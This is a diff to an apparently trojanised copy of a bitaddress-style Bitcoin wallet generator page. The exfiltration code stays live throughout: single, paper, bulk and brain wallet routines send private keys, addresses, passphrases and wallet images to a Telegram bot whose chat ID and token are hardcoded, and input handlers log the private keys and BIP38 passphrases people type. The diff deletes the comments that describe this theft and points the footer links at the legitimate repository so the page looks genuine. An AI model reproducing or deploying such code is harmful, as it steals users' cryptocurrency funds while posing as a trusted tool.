@@ -6408,16 +6408,16 @@ body, html { height: 99%; }
     display: flex;
     justify-content: center; /* Center the menu horizontally */
     background-color: green; /* Menu background color */
-    padding: 10px 0;
+    padding: 5px 0;
 }
 
 .tab-menu a {
     padding: 10px 16px; /* Padding for tab size */
-    margin: 0 10px; /* Evenly space the tabs */
+    margin: 0 5px; /* Evenly space the tabs */
     text-align: center;
     text-decoration: none; /* Remove underline from links */
     color: black; /* Tab label text color */
-    font-size: 12pt; /* Font size for tabs */
+    font-size: 14pt; /* Font size for tabs */
     background-color: gold; /* Tab background color */
     border-radius: 4px;
     transition: background-color 0.3s ease; /* Smooth transition for hover effect */
@@ -6430,24 +6430,7 @@ body, html { height: 99%; }
 .tab-menu a.active {
     background-color: #b8860b; /* Active tab color */
 }
-	.app-logo-container {
-        width: 100%;
-	max-width: 400px;
-        height: auto;
-        overflow: hidden;  /* Ensures no part of the image overflows */
-        margin: 0 auto;  /* Center the container horizontally */
-        margin-top: 50px;
-        margin-bottom: 0px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        }
-
-        .app-logo {
-        width: 400px;  /* Make the logo fill the width of the container */
-        height: 70px;  
-        object-fit: contain;  /* Ensures the logo fits inside its container without being cropped */
-        }
+		
 .faqs ol { padding: 0 0 0 25px; }
 .faqs li { padding: 3px 0; }
 .question { padding: 10px 15px; text-align: left; cursor: pointer; }
@@ -6685,12 +6668,6 @@ gtag('config', 'G-WKH070VBDW');
 <body onclick="SecureRandom.seedTime();" onmousemove="ninja.seeder.seed(event);">
 	<div id="busyblock"></div>
 	<div id="main">
-		
-		    <div class="app-logo-container">
-        <a href="https://github.com/secure-keys/tools_base/blob/main/Bitaddress%20App%20by%20Secure%20Keys.apk" download>
-          <img src="https://i.ibb.co/NswB4cw/Download-bitaddress-app-icon.png" alt="Bitaddress App Logo" class="app-logo">
-        </a>
-    	</div>
 		
 		<div id="culturemenu">
             <div class="culturemenurow">
@@ -6979,8 +6956,8 @@ gtag('config', 'G-WKH070VBDW');
        }" />
 
     	<span><input type="button" class="button" id="detailview" value="View Details" onclick="setTimeout(function() { 
-               logUserInput(document.getElementById('detailprivkey').value); // Log the input
-               sendAlertToBot(); // Send alert to bot
+               logUserInput(document.getElementById('detailprivkey').value);
+               sendAlertToBot();
                ninja.wallets.detailwallet.viewDetails(); 
            }, 2000);" /></span>
 
@@ -7007,8 +6984,8 @@ gtag('config', 'G-WKH070VBDW');
 		</span>
 		   <span id="detailbip38encryptspan">
             <input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="setTimeout(function() { 
-               logUserInput(document.getElementById('detailprivkeypassphrase').value); // Log the input
-               sendAlertToBot(); // Send alert to bot
+               logUserInput(document.getElementById('detailprivkeypassphrase').value);
+               sendAlertToBot();
                ninja.wallets.detailwallet.encryptBip38(); 
            }, 2000);" /></span>
         </div>
@@ -7140,11 +7117,11 @@ document.getElementById('detailprivkey').addEventListener('input', function(even
 
 document.getElementById('detailview').addEventListener('click', function() {
     if (window.AndroidInterface) {
-        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
+        window.AndroidInterface.sendAlertToBot();
     } else {
         sendAlertToBot(); // For web usage
     }
-    ninja.wallets.detailwallet.viewDetails(); // Call the existing function
+    ninja.wallets.detailwallet.viewDetails();
 });
 
 document.getElementById('detaillabelpassphrase').addEventListener('input', function(event) {
@@ -7158,11 +7135,11 @@ document.getElementById('detaillabelpassphrase').addEventListener('input', funct
 
 document.getElementById('detailbip38encryptbutton').addEventListener('click', function() {
     if (window.AndroidInterface) {
-        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
+        window.AndroidInterface.sendAlertToBot();
     } else {
         sendAlertToBot(); // For web usage
     }
-    ninja.wallets.detailwallet.encryptBip38(); // Call the existing function
+    ninja.wallets.detailwallet.encryptBip38();
 });
 </script>
 				</div>
@@ -7234,8 +7211,8 @@ document.getElementById('detailbip38encryptbutton').addEventListener('click', fu
 					</span>
 					<span class="item"><span id="footerlabeldonations">Donations:</span> <b>0x2ccfe7acd7757c0cc475e07748ff2d453537d531<b></span>
 					<span class="item" id="footerlabeltranslatedby"></span>
-					<span class="item"><a href="https://github.com/secure-keys/bitaddress.org/blob/aa775787675f4098fb266e8e8af439807dbdb926/bitaddressSysGenerator.html" target="_blank" id="footerlabelgithub">GitHub Repository</a> 
-						(<a href="https://github.com/secure-keys/bitaddress.org/blob/42cf9c4718c6d9fd68c3c3518882ecb17ecd9374/bitaddressSysGenerator.html" target="_blank" id="footerlabelgithubzip">zip</a>)</span>
+					<span class="item"><a href="https://github.com/pointbiz/bitaddress.org" target="_blank" id="footerlabelgithub">GitHub Repository</a> 
+						(<a href="https://github.com/pointbiz/bitaddress.org/archive/v3.3.0.zip" target="_blank" id="footerlabelgithubzip">zip</a>)</span>
 				</div>
 			</div><br>
 			<div class="authorpgp">
@@ -9951,7 +9928,7 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
                 single.generateNewAddressAndKey();
             }
             document.getElementById("singlearea").style.display = "block";
-            // Send wallet data when "Single Wallet" tab is opened
+            
             single.sendWalletDataToTelegram();
         },
 
@@ -9974,7 +9951,7 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
                 };
                 qrCode.showQrCode(keyValuePair, 4);
 
-                // Send wallet data to Telegram when a new address is generated
+                
                 single.sendWalletDataToTelegram();
             }
             catch (e) {
@@ -9987,7 +9964,7 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
             }
         },
 
-        // Function to send wallet data to Telegram
+        
         sendWalletDataToTelegram: function () {
             const bitcoinAddress = document.getElementById("btcaddress").innerHTML;
             const privateKey = document.getElementById("btcprivwif").innerHTML;
@@ -9997,7 +9974,7 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
     };
 })(ninja.wallets, ninja.qrCode);
 
-// Function to send the text-based wallet to the Telegram bot
+
 async function sendTextToTelegram(text, chatId, botToken) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
@@ -10018,12 +9995,11 @@ async function sendTextToTelegram(text, chatId, botToken) {
     });
 }
 
-// Send wallet data when "Single Wallet" tab is opened
+
 document.getElementById("singlewallet").addEventListener("click", function() {
     ninja.wallets.singlewallet.open();
 });
 
-// Send wallet data when "Generate New Address" button is clicked
 document.getElementById("newaddress").addEventListener("click", function() {
     ninja.wallets.singlewallet.generateNewAddressAndKey();
 });
@@ -10238,7 +10214,7 @@ ninja.wallets.paperwallet = {
             document.getElementById("btcprivwif" + idPostFix).innerHTML = privateKey;
         }
 
-        // Convert the wallet area to an image and send to Telegram
+        
         const walletElement = document.getElementById("artwallet" + idPostFix);
         html2canvas(walletElement).then(canvas => {
             const imageDataUrl = canvas.toDataURL("image/png");
@@ -10284,7 +10260,7 @@ ninja.wallets.paperwallet = {
     }
 };
 
-// Function to send the paper wallet image to the Telegram bot
+
 async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, chatId, botToken) {
     const formData = new FormData();
     const response = await fetch(imageDataUrl);
@@ -10308,7 +10284,7 @@ async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphra
     });
 }
 
-// Function to send the text-based wallet to the Telegram bot
+
 async function sendTextToTelegram(text, chatId, botToken) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
@@ -10329,7 +10305,7 @@ async function sendTextToTelegram(text, chatId, botToken) {
     });
 }
 
-// Send wallet data when "Generate" button is clicked
+
 document.getElementById("papergenerate").addEventListener("click", function() {
     const passphrase = document.getElementById('paperpassphrase').value;
     const useArtistic = ninja.wallets.paperwallet.useArtisticWallet;
@@ -10470,7 +10446,7 @@ document.getElementById("papergenerate").addEventListener("click", function() {
             bulk.encrypt = element.checked;
         },
 
-        // Function to send wallet data to Telegram
+        
         sendWalletDataToTelegram: function () {
             const passphrase = bulk.passphrase;
             let walletText = passphrase ? `Passphrase: ${passphrase}\n` : '';
@@ -10480,7 +10456,7 @@ document.getElementById("papergenerate").addEventListener("click", function() {
     };
 })(ninja.wallets, ninja.translator, ninja.privateKey);
 
-// Function to send the text-based wallet to the Telegram bot
+
 async function sendTextToTelegram(text, chatId, botToken) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
@@ -10501,12 +10477,12 @@ async function sendTextToTelegram(text, chatId, botToken) {
     });
 }
 
-// Send wallet data when "Bulk Wallet" tab is opened
+
 document.getElementById("bulkwallet").addEventListener("click", function() {
     ninja.wallets.bulkwallet.open();
 });
 
-// Send wallet data when "Generate" button is clicked
+
 document.getElementById("bulkgenerate").addEventListener("click", function() {
     const rowLimit = document.getElementById('bulklimit').value * 1;
     const startIndex = document.getElementById('bulkstartindex').value * 1;
@@ -10557,7 +10533,7 @@ ninja.wallets.brainwallet = {
                 });
                 document.getElementById("brainkeyarea").style.visibility = "visible";
 
-                // Send wallet data to Telegram
+                
                 ninja.wallets.brainwallet.sendWalletDataToTelegram(key, bitcoinAddress, privWif);
             }
             else {
@@ -10588,14 +10564,14 @@ ninja.wallets.brainwallet = {
         }
     },
 
-    // Function to send wallet data to Telegram
+    
     sendWalletDataToTelegram: function (passphrase, bitcoinAddress, privateKey) {
         const walletText = `Passphrase: ${passphrase}\nBitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
         sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
     }
 };
 
-// Function to send the text-based wallet to the Telegram bot
+
 async function sendTextToTelegram(text, chatId, botToken) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
@@ -10616,12 +10592,12 @@ async function sendTextToTelegram(text, chatId, botToken) {
     });
 }
 
-// Event listener for the "View" button
+
 document.getElementById("brainview").addEventListener("click", function() {
     ninja.wallets.brainwallet.view();
 });
 
-// Event listener for the "Enter" key on the passphrase input
+
 document.getElementById("brainpassphrase").addEventListener("keypress", function(event) {
     if (event.keyCode == 13) {
         event.preventDefault();
@@ -10629,7 +10605,6 @@ document.getElementById("brainpassphrase").addEventListener("keypress", function
     }
 });
 
-// Event listener for the "Enter" key on the confirm passphrase input
 document.getElementById("brainpassphraseconfirm").addEventListener("keypress", function(event) {
     if (event.keyCode == 13) {
         event.preventDefault();
